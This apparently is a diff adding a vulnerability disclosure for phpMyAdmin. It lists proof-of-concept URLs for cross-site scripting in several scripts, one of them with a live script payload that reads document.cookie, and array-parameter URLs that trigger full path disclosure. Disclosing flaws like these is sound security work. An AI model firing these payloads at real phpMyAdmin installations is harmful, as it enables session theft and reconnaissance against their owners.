@@ -1,0 +1,23 @@
+
+Cross-site scripting:
+http://www.example.com/phpmyadmin/db_create.php?token=your_token&amp;reload=1&amp;db=[double 
+xss(2 followed xss)]
+http://www.example.com/phpmyadmin/db_operations.php?db_collation=latin1_swedish_ci&amp;db_copy=true&amp;db=prout&amp;token=your_token&amp;newname=[xss]
+http://www.example.com/phpmyadmin/querywindow.php
+token=your_token&amp;db=&amp;table=&amp;query_history_latest=[xss]&amp;query_history_latest_db=[xss]&amp;querydisplay_tab=[xss]
+http://www.example.com/phpmyadmin/sql.php?db=information_schema&amp;token=your_token&amp;goto=db_details_structure.php&amp;table=CHARACTER_SETS&amp;pos=&lt;/textarea&gt;&#039;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+Full path disclosure :
+http://www.example.com/scripts/check_lang.php
+http://www.example.com/themes/darkblue_orange/layout.inc.php
+http://www.example.com/index.php?lang[]=
+http://www.example.com/index.php?target[]=
+http://www.example.com/index.php?db[]=
+http://www.example.com/index.php?goto[]=
+http://www.example.com/left.php?server[]=
+http://www.example.com/index.php?table[]=
+http://www.example.com/server_databases.php?token=your_token&amp;sort_by=&quot;
+http://www.example.com/index.php?db=information_schema&amp;token=your_token&amp;tbl_group[]=
+http://www.example.com/db_printview.php?db=&quot;
+http://www.example.com/sql.php?back[]= 
+
